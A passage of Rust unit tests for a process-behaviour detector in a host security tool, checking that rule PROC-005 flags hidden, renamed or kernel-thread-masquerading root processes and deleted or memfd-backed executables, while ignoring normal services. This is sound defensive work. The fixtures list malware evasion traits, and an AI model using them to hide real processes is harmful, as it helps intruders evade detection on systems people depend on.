        assert!(assessment.is_some_and(|assessment| {
            assessment.is_suspicious(70)
                && assessment.has_feature("kernel_thread_masquerade")
                && assessment.has_feature("web_path_executable")
        }));
    }

    #[test]
    fn behavior_cluster_uses_public_outbound_context_for_renamed_process() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let process = process_event("/usr/local/bin/.sysd", ".sysd", ".sysd --worker")
            .with_field("cwd", "/")
            .with_field("euid", "0")
            .with_field("socket_fd_count", "1");
        let outbound = RawEvent::new("network", "outbound_connection")
            .with_field("pid", "42")
            .with_field("remote_addr", "8.8.8.8")
            .with_field("remote_port", "443")
            .with_field("remote_public", "true");

        let findings = ProcessDetector.detect(&[process, outbound], &ctx);

        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "PROC-005")
            .expect("renamed process behavior cluster finding");
        assert!(finding.evidence.iter().any(|item| {
            item.key == "risk_features" && item.value.contains("public_outbound_connections")
        }));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "outbound_remote_ports" && item.value == "443"));
    }

    #[test]
    fn temporary_process_dedup_uses_executable_path_not_pid() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let first = process_event("/tmp/.x", ".x", "/tmp/.x");
        let second = process_event("/tmp/.x", ".x", "/tmp/.x").with_field("pid", "43");

        let left = ProcessDetector.detect(&[first], &ctx);
        let right = ProcessDetector.detect(&[second], &ctx);

        assert_eq!(left.len(), 1);
        assert_eq!(right.len(), 1);
        assert_eq!(left[0].subject, "/tmp/.x");
        assert_eq!(left[0].dedup_key, right[0].dedup_key);
    }

    #[test]
    fn process_dedup_ignores_volatile_runtime_metrics() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let first = process_event("/usr/local/bin/.sysd", ".sysd", ".sysd --worker")
            .with_field("pid", "42")
            .with_field("cwd", "/")
            .with_field("euid", "0")
            .with_field("socket_fd_count", "1")
            .with_field("cpu_percent", "81.0")
            .with_field("process_age_seconds", "130.0")
            .with_field("public_outbound_count", "1");
        let second = process_event("/usr/local/bin/.sysd", ".sysd", ".sysd --worker")
            .with_field("pid", "84")
            .with_field("cwd", "/")
            .with_field("euid", "0")
            .with_field("socket_fd_count", "1")
            .with_field("cpu_percent", "97.0")
            .with_field("process_age_seconds", "3600.0")
            .with_field("public_outbound_count", "3");

        let left = ProcessDetector.detect(&[first], &ctx);
        let right = ProcessDetector.detect(&[second], &ctx);

        let left = left
            .iter()
            .find(|finding| finding.rule_id == "PROC-005")
            .expect("left behavior finding");
        let right = right
            .iter()
            .find(|finding| finding.rule_id == "PROC-005")
            .expect("right behavior finding");
        assert_eq!(left.subject, "/usr/local/bin/.sysd");
        assert_eq!(left.dedup_key, right.dedup_key);
    }

    #[test]
    fn behavior_cluster_ignores_normal_service_with_many_sockets() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event("/usr/sbin/nginx", "nginx", "nginx: worker process")
            .with_field("cwd", "/")
            .with_field("socket_fd_count", "64");

        let findings = ProcessDetector.detect(&[event], &ctx);

        assert!(findings.iter().all(|finding| finding.rule_id != "PROC-005"));
    }

    #[test]
    fn behavior_cluster_ignores_business_service_with_root_sockets_and_restart() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event(
            "/root/quant-qmt-RL-new/runtime/bin/quant-backend",
            "quant-backend",
            "/root/quant-qmt-RL-new/runtime/bin/quant-backend",
        )
        .with_field("cwd", "/root/quant-qmt-RL-new")
        .with_field("euid", "0")
        .with_field("socket_fd_count", "22")
        .with_field("public_outbound_count", "14")
        .with_field("process_start_changed", "true")
        .with_field("previous_process_start_ticks", "100")
        .with_field("current_process_start_ticks", "200");

        let findings = ProcessDetector.detect(&[event], &ctx);

        assert!(findings.iter().all(|finding| finding.rule_id != "PROC-005"));
    }

    #[test]
    fn behavior_cluster_detects_privileged_kernel_thread_masquerade() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event("/usr/local/bin/kworker", "kworker", "kworker --daemon")
            .with_field("cwd", "/")
            .with_field("euid", "0")
            .with_field("socket_fd_count", "0");

        let assessment = behavior_cluster_assessment(&event, &ctx);

        assert!(assessment.is_some_and(|assessment| {
            assessment.is_suspicious(70)
                && assessment.has_feature("kernel_thread_masquerade")
                && assessment.has_feature("privileged_suspicious_process")
        }));
    }

    #[test]
    fn deleted_executable_model_detects_temp_deleted_payload() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event("/dev/shm/.x (deleted)", ".x", "/dev/shm/.x");
        let assessment = deleted_executable_assessment(&event, &ctx);
        assert!(assessment.is_some_and(|assessment| {
            assessment.is_suspicious(70) && assessment.has_feature("temporary_deleted_executable")
        }));
    }

    #[test]
    fn deleted_executable_model_detects_memfd_payload() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event("memfd:kworker (deleted)", "kworker", "kworker");
        let assessment = deleted_executable_assessment(&event, &ctx);
        assert!(assessment.is_some_and(|assessment| {
            assessment.is_suspicious(70) && assessment.has_feature("anonymous_deleted_executable")
        }));
    }

    fn process_event(exe_path: &str, name: &str, cmdline: &str) -> RawEvent {
        RawEvent::new("process", "process_snapshot")
            .with_field("pid", "42")
            .with_field("ppid", "1")
            .with_field("name", name)
            .with_field("exe_path", exe_path)
            .with_field("cmdline", cmdline)
    }
}
